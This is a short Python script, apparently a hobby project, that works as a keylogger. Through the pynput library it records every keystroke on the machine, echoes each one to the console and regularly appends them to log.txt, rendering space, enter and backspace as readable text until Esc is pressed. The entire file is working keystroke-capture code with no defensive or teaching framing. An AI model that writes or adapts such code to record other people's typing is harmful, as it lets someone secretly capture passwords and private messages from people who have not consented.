import pynput
from pynput.keyboard import Key, Listener

keys = []
actions = 0
updateEvery = 10

def keyPress(key):
    global keys, actions, updateEvery
    actions += 1
    keys.append(key)

    if actions >= updateEvery:
        actions = 0
        writeFile(keys)
        keys = []
    print("{} pressed".format(key))

def keyRelease(key):
    if key == Key.esc: #Exit when esc key is pressed
        return False

def writeFile(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("Key.space") != -1: #Checks specifically for space
                file.write(" ")
            elif k.find("Key.enter") != -1:
                file.write("\n")
            elif k.find("Key.backspace") != -1:
                file.write("(DEL)")
            elif k.find("Key") == -1: #Writes normal characters and numbers
                file.write(k)

with Listener(on_press = keyPress, on_release = keyRelease) as listener:
    listener.join()
